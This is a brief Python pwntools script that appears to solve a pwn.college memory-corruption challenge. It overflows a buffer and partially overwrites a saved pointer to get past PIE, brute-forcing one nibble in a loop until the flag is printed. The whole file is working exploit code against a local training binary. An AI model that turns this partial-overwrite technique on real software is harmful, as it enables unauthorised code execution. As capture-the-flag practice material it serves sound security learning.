from pwn import *
import random

context.binary = elf = ELF('/challenge/pointer-problems-easy', checksec=False)

'''
cause PIE enable, we can leverage partial write, the last three nibbles is fixed.
we only need guess fourth nibble from right to left 0xfffffffff3080
                                                               ^
'''
padding_size = 0x20
fixed_offset = b'\x60'
possible_bytes = [bytes([i]) for i in range(0x00, 0x100, 0x10)]


while True:
    io = elf.process()
    payload = b'A' * padding_size + fixed_offset + random.choice(possible_bytes)
    io.sendline(f'{len(payload)}'.encode())
    io.sendline(payload)

    response = io.recvall()

    if b'pwn.college' in response:
        print(response.decode())
        exit()
